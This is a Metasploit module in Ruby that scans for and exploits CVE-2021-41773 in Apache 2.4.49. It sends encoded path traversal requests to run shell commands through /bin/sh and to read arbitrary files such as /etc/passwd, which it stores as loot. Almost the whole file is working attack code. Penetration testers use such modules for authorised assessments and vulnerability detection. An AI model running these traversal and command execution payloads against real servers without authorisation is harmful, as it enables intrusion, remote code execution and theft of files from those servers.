##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Apache 2.4.49 Traversal RCE scanner',
        'Description' => %q{
          This module scan for an unauthenticated RCE vulnerability which exists in Apache version 2.4.49 (CVE-2021-41773).
          If files outside of the document root are not protected by ‘require all denied’ and CGI has been explicitly enabled,
          it can be used to execute arbitrary commands (Remote Command Execution).
        },
        'References' => [
          ['CVE', '2021-41773'],
          ['URL', 'https://httpd.apache.org/security/vulnerabilities_24.html'],
          ['URL', 'https://github.com/RootUp/PersonalStuff/blob/master/http-vuln-cve-2021-41773.nse']
        ],
        'Author' => [
          'Ash Daulton', # Vulnerability discovery
          'Dhiraj Mishra', # Metasploit auxiliary module
          'mekhalleh (RAMELLA Sébastien)' # Metasploit exploit module (Zeop Entreprise)
        ],
        'DisclosureDate' => '2021-05-10',
        'License' => MSF_LICENSE,
        'DefaultOptions' => {
          'RPORT' => 443,
          'SSL' => true
        },
        'Actions' => [
          [
            'Traversal', {
              'Description' => 'Basic scanner for CVE-2021-41773 when mod_cgi is disabled.'
            }
          ],
          [
            'RCE', {
              'Description' => 'Basic scanner for CVE-2021-41773 when mod_cgi is enabled.'
            }
          ],
          [
            'Read', {
              'Description' => 'Exploit for CVE-2021-41773 to read local file on the remote server.'
            }
          ]
        ],
        'DefaultAction' => 'Traversal'
      )
    )

    register_options([
      OptString.new('FILEPATH', [false, 'File you want to read', '/etc/passwd']),
      OptString.new('TARGETURI', [true, 'Base path', '/cgi-bin']),
      OptInt.new('DEPTH', [true, 'Depth for Path Traversal', 5])
    ])
  end

  def message(msg)
    "#{@proto}://#{datastore['RHOST']}:#{datastore['RPORT']} - #{msg}"
  end

  def exec_traversal(cmd)
    send_request_raw({
      'method' => 'POST',
      'uri' => normalize_uri(datastore['TARGETURI'], @traversal.to_s),
      'data' => "#{Rex::Text.rand_text_alpha(1..3)}=|echo;#{cmd}"
    })
  end

  def read_traversal
    send_request_raw({
      'method' => 'GET',
      'uri' => normalize_uri(datastore['TARGETURI'], @traversal.to_s)
    })
  end

  def run_host(ip)
    @proto = (ssl ? 'https' : 'http')

    case action.name
    when /Traversal/
      @traversal = '.%2e/'
      response = read_traversal
      unless response
        print_error(message('No response, target seems down.'))

        return Exploit::CheckCode::Unknown
      end

      case response.code
      when 200
        print_good(message('The target is vulnerable to CVE-2021-41773 (mod_cgi disabled).'))
      when 403
        print_warning(message('The target is vulnerable to CVE-2021-41773 (mod_cgi disabled) - but the target path doen\'t exist).'))
      when 500
        print_good(message('The target is vulnerable to CVE-2021-41773 (mod_cgi enabled).'))
      else
        print_error(message('The target is not vulnerable to CVE-2021-41773.'))

        return Exploit::CheckCode::Safe
      end

      vprint_status("Obtained HTTP response code #{response.code}.")
      report_vuln(
        host: target_host,
        name: name,
        refs: references
      )

      return Exploit::CheckCode::Vulnerable
    when /RCE/
      @traversal = '.%2e/' * datastore['DEPTH'] << '/bin/sh'
      rand_str = Rex::Text.rand_text_alpha(4..8)

      response = exec_traversal("echo #{rand_str}")
      if response.code == 200 && response.body.include?(rand_str)
        print_good(message('The target is vulnerable to CVE-2021-41773 (mod_cgi enabled).'))
        report_vuln(
          host: target_host,
          name: name,
          refs: references
        )

        return Exploit::CheckCode::Vulnerable
      end
      print_error(message('The target is not vulnerable to CVE-2021-41773.'))

      return Exploit::CheckCode::Safe
    when /Read/
      fail_with(Failure::BadConfig, 'File path option is empty!') if !datastore['FILEPATH'] || datastore['FILEPATH'].empty?

      @traversal = '.%2e/' * datastore['DEPTH'] << datastore['FILEPATH']

      response = read_traversal
      unless response && response.code == 200
        print_error('Nothing was downloaded')

        return
      end

      vprint_good("#{peer} \n#{response.body}")
      path = store_loot(
        'apache.traversal',
        'application/octet-stream',
        ip,
        response.body,
        datastore['FILEPATH']
      )
      print_good("File saved in: #{path}")
    end
  end
end
